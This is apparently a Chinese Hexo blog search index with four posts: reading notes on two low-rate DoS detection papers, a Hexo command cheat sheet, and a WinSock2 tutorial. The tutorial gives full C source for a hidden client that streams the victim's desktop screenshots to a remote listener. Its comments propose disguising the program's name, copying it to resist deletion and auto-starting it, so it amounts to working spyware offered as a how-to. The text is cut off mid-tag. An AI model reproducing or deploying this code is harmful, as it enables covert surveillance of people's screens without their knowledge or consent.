<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>文献阅读-自适应具有噪声点的基于密度的聚类(SADBSCAN)</title>
    <link href="/2023/02/01/%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB-%E8%87%AA%E9%80%82%E5%BA%94%E5%85%B7%E6%9C%89%E5%99%AA%E5%A3%B0%E7%82%B9%E7%9A%84%E5%9F%BA%E4%BA%8E%E5%AF%86%E5%BA%A6%E7%9A%84%E8%81%9A%E7%B1%BB-SADBSCAN/"/>
    <url>/2023/02/01/%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB-%E8%87%AA%E9%80%82%E5%BA%94%E5%85%B7%E6%9C%89%E5%99%AA%E5%A3%B0%E7%82%B9%E7%9A%84%E5%9F%BA%E4%BA%8E%E5%AF%86%E5%BA%A6%E7%9A%84%E8%81%9A%E7%B1%BB-SADBSCAN/</url>
    
    <content type="html"><![CDATA[<h1 id="文献阅读">文献阅读</h1><h2id="标题the-detection-of-low-rate-dos-attacks-using-the-sadbscan-algorithm">标题：Thedetection of low-rate DoS attacks using the SADBSCAN algorithm</h2><h4id="作者dan-tang-siqi-zhang-jingwen-chen-xiyin-wang-日期2021">作者：DanTang, Siqi Zhang, Jingwen Chen, Xiyin Wang 日期：2021</h4><p><strong>摘要：</strong>提出了一种新的基于自适应密度的噪声应用空间聚类(SADBSCAN)算法的低速率DoS攻击检测方案。SADBSCAN算法提供了一种在多密度数据集中自适应识别聚类的解决方案。根据网络流量遭受低速率DoS攻击的特点，使用SADBSCAN算法对网络流量进行分组。然后，使用余弦相似度来判断组是否包含低速率DoS攻击。为了评估性能，进行了实验，并与其他检测方案的结果进行了比较。实验数据包括NS-2和TestBed仿真生成的数据以及WIDE公开数据集。结果表明我们的方案提高了检测精度，降低了漏报率，能够适应大规模复杂网络环境。</p><p><strong>关键词：</strong>低速率DoS、攻击检测、SADBSCAN、网络流量分析、余弦相似度</p><p><strong>文章特点：</strong></p><ol type="1"><li>分析针对TCP协议的LDoS攻击模型。</li><li>检测模型适用大规模网络。</li><li>无监督学习。</li><li>聚类方法面临的挑战是确定聚类的度量指标以及如何对聚类的结果进行标记。</li><li>分析了网络遭受低速率DoS攻击时的流量特征。</li><li>优化了基于密度的聚类算法，并实现了SADBSCAN算法来识别低速率DoS攻击。</li><li>在NS -2上模拟了多组不同参数的低速率DoS攻击场景并搭建了TestBed。</li><li>在三个数据集上进行实验，并将我们的方案与其他检测方法进行比较。</li></ol><p><strong>实验方法：</strong></p><p>在该方案中，我们首先提取网络流量的特征值进行聚类。然后，利用余弦相似度分析聚类得到的簇和噪声点是否为低速率DoS攻击的类别。为了评估我们的方案，我们在三个数据集上进行了实验。其中一个数据集来自网络仿真平台NS-2。其中一个数据集来自我们搭建的真实网络环境TestBed。最后一个数据集来自WIDE公开数据集。最后，将本文算法与其他检测方法进行比较，说明本文算法的高效性。由于大部分低速率DoS攻击都是针对TCP的，因此我们研究以UDP流量为恶意流量的TCP为目标的低速率DoS攻击。</p><hr /><h4 id="tcp协议">TCP协议</h4><p>本文针对TCP协议的RTO机制和AIMD机制，重点研究低速率DoS攻击。我们以当今最流行的TCP版本NewReno为例简要介绍了这两种机制。在RTO机制中，TCP发送者为每次发送的消息设置一个定时器。当消息确认未按时接收时，拥塞窗口(cwnd)重新赋值为1。TCP发送端触发慢启动并重新发送数据。具体的RTO值由往返时间(RTT)决定。式中：式(1)给出了核心公式，其中G为时间尺度，通常小于100ms。SRTT表示平滑后的RTT。VRTT每次更新公式为(2)表示RTT的变化。在实际网络中，RTT通常为10~ 100 ms，RTO的最小值通常为1 s 。</p><center><span class="math inline">\(RTO = max(minRTO,SRTT +max(G,4RTTVAR))\)</span><br /><span class="math inline">\(SRTT = (7SRTT+ RTT)/8\)</span><br /><span class="math inline">\(VRTT = 3VRTT+|SRTT-RTT|/4\)</span></center><p>在AIMD机制中，当收到3个重复的ACK消息时，TCP发送方将cwnd减少为之前大小的一半。然后触发cwnd线性增长的拥塞避免(对于每个通过的RTT,近似为1) 。</p><hr /><h4 id="算法内容">算法内容</h4><ul><li>SADBSCAN算法自适应地对高密度点及其邻域进行聚类，并将位于低密度区域的孤立点标记为噪声。解决了传统基于密度的聚类无法识别多密度簇的问题。</li><li>SADBSCAN算法可以帮助我们更好地识别隐藏在背景流量中具有不同攻击参数的低速率DoS攻击。在使用SADBSCAN算法对网络流量进行聚类后，我们根据每个簇或噪声点与训练数据的余弦相似度对聚类结果进行分析并标记。</li><li>为了便于检测，我们将测试数据集划分为n个大小相等的数据单元，并输出每个数据单元的测试结果。</li></ul><h5 id="特征分析">特征分析</h5><p>在低速率DoS攻击场景下，UDP数据包速率显著增加，并表现出明显的周期性。TCP流量波动剧烈，其平均流量大幅下降。<br />使用TCP和UDP流的方差(var )和平均偏差( MD )作为特征值来表示网络流量的波动程度。 <spanclass="math display">\[\operatorname{var}=\frac{\sum_{i=1}^{n}\left(x_{i}-\text { mean}^{2})\right.}{n}\]</span></p><p><span class="math display">\[MD=\frac{\sum_{i=1}^{n} \mid x_{i}-\text {mean} \mid}{n}\]</span>使用t-SNE来证明选取的特征在实验中是有效的。<br />使用归一化处理将不同尺度上测量的数据调整到同一尺度。<span class="math display">\[\mathrm{x}_{\mathrm{i}}^{\prime}=\frac{x_{i}-\min (f)}{\max (f)-\min(f)}\left(\max _{\text {new }}(f)-\min _{\text {new }}(f)\right)+\min_{\text {new }}(f)\]</span></p><h5 id="sadbscan算法">SADBSCAN算法</h5><h5 id="计算复杂度分析">计算复杂度分析</h5><h5 id="余弦相似度分析">余弦相似度分析</h5><h5 id="攻击检测方案">攻击检测方案</h5><h4 id="算法实验评估">算法实验评估</h4><p>NS-2实验</p><p>TestBed实验</p><p>WIDE数据实验</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文献阅读:混合神经网络(CNN/RNN/BGRU)</title>
    <link href="/2023/01/30/%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB-%E6%B7%B7%E5%90%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-CNN-RNN-BGRU/"/>
    <url>/2023/01/30/%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB-%E6%B7%B7%E5%90%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-CNN-RNN-BGRU/</url>
    
    <content type="html"><![CDATA[<h1 id="文献阅读">文献阅读</h1><h2id="标题low-rate-dos-attack-detection-method-based-on-hybrid-deep-neural-networks">标题：Low-rateDoS attack detection method based on hybrid deep neural networks</h2><h4 id="作者congyuan-xu-jizhong-shen-xin-du-日期082021">作者：CongyuanXu, Jizhong Shen, Xin Du 日期：08/2021</h4><p><strong>摘要：</strong>本文利用一维卷积神经网络和门控循环单元，提出了一种基于混合深度神经网络的LDoS攻击检测方法。为了评估本文提出的检测方法在真实场景中的表现，我们从数据中心的一个网站中捕获了真实的合法流量，并在实验室环境中对网站的镜像进行了多种真实的LDoS攻击，以获得真实的攻击流量。在真实流量上的检测结果表明，所提检测方法无需人工提取特征，能够有效检测波动HTTP流量中的LDoS攻击，平均检测率为98.68%，比基于MF - DFA或功率谱密度的检测方法更具优势。</p><p><strong>关键词：</strong>网络安全、入侵检测系统、LDoS、卷积神经网络、门控循环单元、深度学习</p><p><strong>文章特点：</strong></p><ol type="1"><li>利用真实网络流量和实验室攻击流量创建数据集</li><li>利用混合神经网络自动挖掘LDoS攻击特征、</li><li>深度分析卷积神经网络，进一步验证了提出的检测方法能够排除合法流量的干扰，准确检测出LDoS攻击的位置</li><li>分析本文检测方法的优势以及和其他深度学习检测方法对比优势</li></ol><p><strong>实验方法：</strong>从真实场景中获取网络流量并进行详细的评估。我们从某高校的网站中收集真实的用户流量，选取其中不包含DoS攻击的部分作为合法流量。然后利用渗透取证系统对孤立网站镜像捕获多种类型的LDoS攻击，得到包含LDoS攻击的流量。通过分析捕获的流量，我们可以评估提出的检测方法。</p><hr /><h4 id="相关工作的不足">相关工作的不足：</h4><p>​过去的一些工作主要利用信号分析技术处理网络流量，论证了检测LDoS攻击的可行性，但存在以下不足。首先，使用网络仿真器(NS2或NS3)模拟LDoS攻击流量并不合适，而真实的LDoS攻击流量是由攻击程序动态生成的，具有时变性，比模拟流量更加复杂。其次，真实的LDoS攻击类型多样。目前，互联网上可以下载多个开源的攻击程序，不同程序的攻击方式有很大差异。LDoS攻击不是一种类型的攻击，而是一类攻击的总称。例如，为了检测HTTP服务LDoS攻击，将FTP流量作为合法流量是不合理的。上述工作依赖于安全专家精心设计的特征提取方法。如果现实环境中出现新的攻击类型，需要人工调整特征提取参数，使得检测方法的适应性有待提高。</p><hr /><p><strong>文章提到的一些内容：</strong></p><ul><li>真实网络环境下的攻击往往和攻击模型有所差异。</li><li>利用不同的LDoS攻击在孤立网络环境中实验以获得攻击流量。</li><li>对多种LDoS攻击进行分析，如Slowloris、Slow POST/READ、Httpbog</li><li>实验发现攻击在时域上并没有明显周期特征，在时频域上有特征出现。</li><li>设计了高性能的网络流量捕获系统，抓取高校合法流量和实验室攻击流量</li><li>【详细的数据集准备过程和实验方法】</li></ul><p><strong>关键点1：数据集</strong></p><p><strong>关键点2：采样方式（将网络流量转化为时间序列，采样间隔，10ms，数据包）</strong></p><p><strong>关键点3：算法(CNN,RNN,BGRU)</strong></p><p><strong>通俗易懂的重点：</strong>在实际场景中，攻击流量会淹没在合法流量中，我们的目标是将攻击流量作为待检测的目标信号，将合法流量作为噪声。所提出的检测方法需要能够从噪声中恢复出目标信号。</p><hr /><p><strong>时间序列模型：CNN/RNN/BGRU</strong> 双向门控循环单元( BGRU)是最适合用于网络流量分类的时间序列建模结构。</p><p>卷积滤波：一维卷积、卷积层、池化层、感受野本文采用卷积核大小为3的CNN级联6层，感受野达到3^6 = 729。若采样间隔为10ms，则特征提取的最大时间跨度为7.29s，可以满足LDoS攻击的特征提取需求。</p><p>网络流量归一化处理、损失函数Fig.9端到端检测LDoS攻击的混合深度神经网络结构</p><hr /><h4 id="模型评估">模型评估</h4><p>深度学习常用的六个评估指标（图）判断模型收敛、超参数设置、参数个数及分布、检测结果(图)</p><p>深度分析卷积神经网络、进一步验证了提出的检测方法能够排除合法流量的干扰，准确检测出LDoS攻击的位置。</p><h4 id="讨论">讨论</h4><p>​ 对比实验</p><ol type="1"><li>其他方法如MF-DFA/PSD无法检测数据集中的LDoS攻击，并说明原因。</li><li>和其他传统和深度学习方法进行比较本文方法具有优势。</li></ol><h4 id="未来工作">未来工作</h4><ol type="1"><li>深度神经网络容易受到对抗样本的影响。本文提出的检测方法基于混合深度神经网络，因此需要对对抗样本进行分析并采取相应的预防措施。</li><li>虽然规模我们提出的混合深度神经网络在深度学习领域的规模不是很大，仍然难以满足网络流量在线检测的需求。网络流量具有突发性，需要对神经网络模型进行压缩，以降低时空复杂度和计算时延，满足实时检测的要求。</li><li>由于监督学习固有的局限性，我们提出的检测方法并不是'银弹'。对于未知类型的攻击，由于模型没有看到它们，因此无法检测。未来的工作可以通过研究半监督和无监督学习算法来进行。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>博客操作指南</title>
    <link href="/2023/01/24/%E5%8D%9A%E5%AE%A2%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/"/>
    <url>/2023/01/24/%E5%8D%9A%E5%AE%A2%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h2 id="html语法">html语法</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span> 段落中换行<br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span>  居中<br><span class="hljs-symbol">&amp;#x0020;</span>空格<br></code></pre></td></tr></table></figure><h2 id="更新博客操作指南">更新博客操作指南</h2><p>在Blog文件路径下打开终端cmd</p><h3 id="常用的hexo-命令">常用的Hexo 命令</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs axapta">hexo s --debug<br>npm install hexo -g <span class="hljs-meta">#安装Hexo</span><br>npm update hexo -g <span class="hljs-meta">#升级 </span><br>hexo init <span class="hljs-meta">#初始化博客</span><br>hexo n <span class="hljs-string">&quot;我的博客&quot;</span> == hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;我的博客&quot;</span> <span class="hljs-meta">#新建文章</span><br>hexo g == hexo generate <span class="hljs-meta">#生成</span><br>hexo s == hexo <span class="hljs-keyword">server</span> <span class="hljs-meta">#启动服务预览</span><br>hexo d == hexo deploy <span class="hljs-meta">#部署</span><br>hexo <span class="hljs-keyword">server</span> <span class="hljs-meta">#Hexo会监视文件变动并自动更新，无须重启服务器</span><br>hexo <span class="hljs-keyword">server</span> -s <span class="hljs-meta">#静态模式</span><br>hexo <span class="hljs-keyword">server</span> -p <span class="hljs-number">5000</span> <span class="hljs-meta">#更改端口</span><br>hexo <span class="hljs-keyword">server</span> -i <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-meta">#自定义 IP</span><br>hexo clean <span class="hljs-meta">#清除缓存，若是网页正常情况下可以忽略这条命令</span><br></code></pre></td></tr></table></figure><h3 id="更新方法">更新方法</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean </span><br><span class="hljs-attribute">hexo g </span><br><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure><p>参考网址：https://zhuanlan.zhihu.com/p/26625249</p>]]></content>
    
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
      <tag>html</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络编程 WinSock2完成屏幕监控</title>
    <link href="/2022/07/12/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-WinSock2%E5%AE%8C%E6%88%90%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/"/>
    <url>/2022/07/12/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-WinSock2%E5%AE%8C%E6%88%90%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/</url>
    
    <content type="html"><![CDATA[<p>本文章通过WinSock2库完成服务器端对客户端的实时屏幕获取。</p><p>主要思路就是通过TCP网络连接，客户端实时抓取屏幕保存在本地并发送给服务器端。</p><span id="more"></span><h2 id="一程序测试">一、程序测试：</h2><p>仅在本机回环地址127.0.0.1测试。</p><p><imgsrc="https://i0.hdslb.com/bfs/album/c0c5cf1712c92fa840092d869d8fc5ecd999e123.png" /></p><p>被监控端打开client.exe（看不到反应，因为隐藏了窗口，但程序已经运行）。</p><p>之后监控端打开service.exe程序。</p><p><img src="https://i0.hdslb.com/bfs/album/6d5c2e943307670d858af8cacecdab2ae5263dc2.png" style="zoom: 25%;" /></p><p>会出现一个窗口，窗口内就是被监控端的电脑屏幕（这里直接是我本机画面），按空格键停止监控，client还在后台运行，用任务管理器关闭。</p><p><img src="https://i0.hdslb.com/bfs/album/463b3302a856960345a95e5a74ad5d7923bfcb11.png" style="zoom:50%;" /></p><!--more--><h2 id="二环境配置">二、环境配置：</h2><p>本代码在VS2019下编写</p><p><img src="https://i0.hdslb.com/bfs/album/fc626417bf0e93762874f5e287ac4d77f9b9f5c8.png" style="zoom:50%;" /></p><p>需要打开两个新项目client和service，分别是客户端和服务器端。</p><p>需要调整属性，项目→属性。</p><p><img src="https://i0.hdslb.com/bfs/album/e6d0a3c9dad5270fa9a6f321a8110fc8472c76d7.png" style="zoom:50%;" /></p><p><img src="https://i0.hdslb.com/bfs/album/920959aaa6500b048cfd58f4bfa524aa1c64e408.png" style="zoom:50%;" /></p><p><img src="https://i0.hdslb.com/bfs/album/6ce086f9020395198c6c0580d8fb7d825109eb5d.png" style="zoom:50%;" /></p><p>将这三个调为图上的配置。</p><p><img src="https://i0.hdslb.com/bfs/album/960aa4a8bf8f5e3c18f809f77583cbb956b68502.png" style="zoom: 67%;" /></p><p>此处是Debug x64。</p><h2 id="三代码">三、代码：</h2><h3 id="被监控端client端">被监控端/client端：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br><span class="hljs-comment">#include&lt;WinSock2.h&gt;</span><br><span class="hljs-comment">#include&lt;easyx.h&gt;</span><br><span class="hljs-comment">#pragma comment(linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="hljs-comment">#pragma comment(lib,&quot;ws2_32.lib&quot;)</span><br><span class="hljs-regexp">//</span>被监控端<br>int main()<br>&#123;<br><span class="hljs-regexp">//</span>按需求可以继续优化以下内容<br><span class="hljs-regexp">//</span>将程序名设置为容易被人打开的<br><span class="hljs-regexp">//</span>防删除，拷贝一份，拷贝到C盘<br><span class="hljs-regexp">//</span>开机自启<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-regexp">//</span>初始化网络资源<br>WSADATA wsaData;<br>WSAStartup(MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData);<br><br><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span>搭建socket网络传输TCP<br>SOCKET hsock = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<span class="hljs-regexp">//</span>IPv4<br>SOCKADDR_IN servAdr;<br>servAdr.sin_family = AF_INET;<br>servAdr.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<span class="hljs-regexp">//</span>本机回环地址<br>servAdr.sin_port = htons(<span class="hljs-number">7777</span>);<br><br><span class="hljs-keyword">while</span>(connect(hsock, (SOCKADDR*)&amp;servAdr, sizeof(servAdr))==SOCKET_ERROR);<br><br><span class="hljs-regexp">//</span>获取桌面图像的准备工作<br>int CX = GetSystemMetrics(SM_CXSCREEN);<span class="hljs-regexp">//</span>水平分辨率<br>int CY = GetSystemMetrics(SM_CYSCREEN);<span class="hljs-regexp">//</span>垂直分辨率<br><span class="hljs-regexp">//</span>CX = CX * <span class="hljs-number">1.25</span>; CY = CY * <span class="hljs-number">1.25</span>;<br>IMAGE image(CX, CY);<span class="hljs-regexp">//</span>定义一张图片，大小和桌面一样大<br>HDC dc, imageDC;<span class="hljs-regexp">//</span>设备上下文<br>char buf[<span class="hljs-number">1024</span>] = &#123; <span class="hljs-number">0</span> &#125;;<span class="hljs-regexp">//</span>发送数据的内存<br>FILE* fp;<span class="hljs-regexp">//</span>文件<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-regexp">//</span>获取一帧<br>dc = CreateDC(<span class="hljs-string">&quot;DISPLAY&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-regexp">//</span>桌面图像<br>imageDC = GetImageHDC(&amp;image);<br><span class="hljs-regexp">//</span>桌面的图像---&gt;image的图像<br>BitBlt(imageDC, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, CX, CY, dc, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, SRCCOPY);<br>saveimage(<span class="hljs-string">&quot;C:\\Users\\Public\\Pictures\\screenshot.jpg&quot;</span>, &amp;image);<br><br><span class="hljs-regexp">//</span>发送一帧<br><span class="hljs-regexp">//</span>打开图片文件<br>fp = fopen(<span class="hljs-string">&quot;C:\\Users\\Public\\Pictures\\screenshot.jpg&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br><span class="hljs-regexp">//</span>计算图片大小<br>fseek(fp, <span class="hljs-number">0</span>, SEEK_END);<span class="hljs-regexp">//</span>光标移动到最后<br>int allbytes = ftell(fp);<span class="hljs-regexp">//</span>返回从文件头到当前光标字节大写<br>fseek(fp, <span class="hljs-number">0</span>, SEEK_SET);<br><span class="hljs-regexp">//</span>发文件大小<br>send(hsock, (const char*)&amp;allbytes, sizeof(allbytes),<span class="hljs-number">0</span>);<br><span class="hljs-regexp">//</span>文件发过去<br>int bytes;<br><span class="hljs-keyword">while</span> ((bytes = fread(buf, <span class="hljs-number">1</span>, <span class="hljs-number">1024</span>, fp)) &gt; <span class="hljs-number">0</span>)<br>send(hsock, buf, bytes, <span class="hljs-number">0</span>);<br>fclose(fp);<br><br><span class="hljs-regexp">//</span>接收-<span class="hljs-number">1</span>不发<br><br><span class="hljs-regexp">//</span>接收<span class="hljs-number">1</span> 继续发<br>int n = <span class="hljs-number">0</span>;<br>recv(hsock, (char*)&amp;n, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (n != <span class="hljs-number">1</span>)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>closesocket(hsock);<br><br><span class="hljs-regexp">//</span>清理网络资源<br>WSACleanup();<br>&#125;<br>return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="监控端service端">监控端/service端：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;WinSock2.h&gt;</span><span class="hljs-comment">//网络头文件</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;easyx.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib,<span class="hljs-string">&quot;ws2_32.lib&quot;</span>)<span class="hljs-comment">//网络库文件</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//初始化网络资源</span><br>WSADATA wsaData;<br><span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData);<br><br><span class="hljs-comment">//搭建socket网络传输TCP</span><br>SOCKET hServSock = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<span class="hljs-comment">//IPv4</span><br>SOCKADDR_IN servAdr;<br>servAdr.sin_family = AF_INET;<br>servAdr.sin_addr.s_addr = <span class="hljs-built_in">htonl</span>(INADDR_ANY);<span class="hljs-comment">//使用服务器地址</span><br>servAdr.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">7777</span>);<br><span class="hljs-built_in">bind</span>(hServSock, (SOCKADDR*)&amp;servAdr, <span class="hljs-built_in">sizeof</span>(servAdr));<br><span class="hljs-built_in">listen</span>(hServSock, <span class="hljs-number">5</span>);<span class="hljs-comment">//监听</span><br><br>SOCKADDR_IN clntAdr;<br><span class="hljs-type">int</span> clntAdrSz = <span class="hljs-built_in">sizeof</span>(clntAdr);<br>SOCKET hsock = <span class="hljs-built_in">accept</span>(hServSock, (SOCKADDR*)&amp;clntAdr, &amp;clntAdrSz);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;已经连接！&quot;</span>);<br><br><span class="hljs-comment">//创建一个窗口</span><br><span class="hljs-built_in">initgraph</span>(<span class="hljs-number">1280</span>, <span class="hljs-number">720</span>, EW_NOCLOSE);<br>FILE* fp;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-comment">//接收文件的数据大小</span><br><span class="hljs-type">int</span> allbytes = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">recv</span>(hsock, (<span class="hljs-type">char</span>*)&amp;allbytes, <span class="hljs-built_in">sizeof</span>(allbytes), <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//创建文件 接收</span><br>fp = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;1.jpg&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><span class="hljs-type">int</span> bytes, sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> ((bytes = <span class="hljs-built_in">recv</span>(hsock, buf, <span class="hljs-number">1024</span>, <span class="hljs-number">0</span>)) &gt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">fwrite</span>(buf, <span class="hljs-number">1</span>, bytes, fp);<br>sum += bytes;<br><span class="hljs-keyword">if</span> (sum &gt;= allbytes)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">fclose</span>(fp);<br><br><span class="hljs-built_in">loadimage</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;1.jpg&quot;</span>, <span class="hljs-number">1280</span>, <span class="hljs-number">720</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetAsyncKeyState</span>(VK_SPACE))<br>&#123;<br><span class="hljs-type">int</span> n = <span class="hljs-number">-1</span>;<span class="hljs-comment">//退出了</span><br><span class="hljs-built_in">send</span>(hsock, (<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)&amp;n, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">closegraph</span>();<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-type">int</span> n = <span class="hljs-number">1</span>;<br><span class="hljs-built_in">send</span>(hsock, (<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)&amp;n, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><span class="hljs-comment">//清理网络资源</span><br><span class="hljs-built_in">WSACleanup</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="四可能遇到的问题">四、可能遇到的问题：</h2><ol 